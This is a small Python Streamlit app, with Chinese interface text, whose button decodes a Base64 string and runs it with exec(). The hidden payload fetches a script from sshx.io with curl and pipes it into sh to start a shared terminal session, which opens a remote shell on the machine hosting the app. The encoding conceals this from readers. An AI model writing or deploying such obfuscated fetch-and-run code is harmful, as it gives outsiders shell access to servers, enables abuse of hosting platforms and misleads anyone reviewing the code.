import streamlit as st
import subprocess
import base64

# Base64 编码的脚本
encoded_script = "CmltcG9ydCBzdHJlYW1saXQgYXMgc3QKaW1wb3J0IHN1YnByb2Nlc3MKCmRlZiBydW5fY29tbWFuZCgpOgogICAgdHJ5OgogICAgICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MucnVuKAogICAgICAgICAgICBbImN1cmwiLCAiLXNTZiIsICJodHRwczovL3NzaHguaW8vZ2V0Il0sCiAgICAgICAgICAgIGNhcHR1cmVfb3V0cHV0PVRydWUsCiAgICAgICAgICAgIHRleHQ9VHJ1ZSwKICAgICAgICAgICAgY2hlY2s9VHJ1ZQogICAgICAgICkKICAgICAgICBzdWJwcm9jZXNzLnJ1bihbInNoIiwgIi1zIiwgInJ1biJdLCBpbnB1dD1yZXN1bHQuc3Rkb3V0LCB0ZXh0PVRydWUsIGNoZWNrPVRydWUpCiAgICAgICAgc3Quc3VjY2Vzcygi5ZG95Luk5omn6KGM5oiQ5Yqf77yBIikKICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvciBhcyBlOgogICAgICAgIHN0LmVycm9yKGYi5ZG95Luk5omn6KGM5aSx6LSlOiB7ZX0iKQoKc3QudGl0bGUoIuaJp+ihjCBTaGVsbCDlkb3ku6QiKQppZiBzdC5idXR0b24oIui/kOihjOWRveS7pCIpOgogICAgcnVuX2NvbW1hbmQoKQo="

def run_encoded_script(encoded_script):
    # 解码 Base64
    decoded_script = base64.b64decode(encoded_script).decode()
    
    # 执行解码后的脚本
    exec(decoded_script)

st.title("执行 Base64 编码的 Shell 命令")

# 使用 Session State 来管理按钮状态
if 'button_clicked' not in st.session_state:
    st.session_state.button_clicked = False

if st.button("运行命令", key="run_command_button"):
    st.session_state.button_clicked = True
    run_encoded_script(encoded_script)

if st.session_state.button_clicked:
    st.success("命令已执行！")
